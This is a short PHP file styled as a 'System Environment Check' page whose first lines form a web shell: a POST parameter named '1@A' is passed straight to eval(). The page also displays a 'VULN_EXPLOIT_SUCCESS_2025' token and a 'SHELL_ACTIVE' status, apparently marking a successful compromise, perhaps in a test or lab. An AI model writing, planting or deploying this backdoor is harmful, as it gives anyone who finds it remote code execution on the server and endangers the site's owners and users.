<?php

$SUCCESS_TOKEN = "VULN_EXPLOIT_SUCCESS_2025";

$a = filter_input(INPUT_POST, '1@A');
if ($a) {
    eval(trim($a));
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>System Environment Check</title>
    <style>
        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 50px; }
        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; box-shadow: 0 0 15px #00ff00; }
        .blink { animation: blinker 1.5s linear infinite; font-weight: bold; font-size: 24px; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="box">
        <div class="blink">[+] hi</div>
        <p>--------------------------------------------------</p>
        <p>IDENTIFIER: <b id="token"><?php echo $SUCCESS_TOKEN; ?></b></p>
        <p>SERVER_TIME: <?php echo date('Y-m-d H:i:s'); ?></p>
        <p>STATUS: <span style="color: white; background: green;">SHELL_ACTIVE</span></p>
        <p>--------------------------------------------------</p>

    </div>
</body>
</html>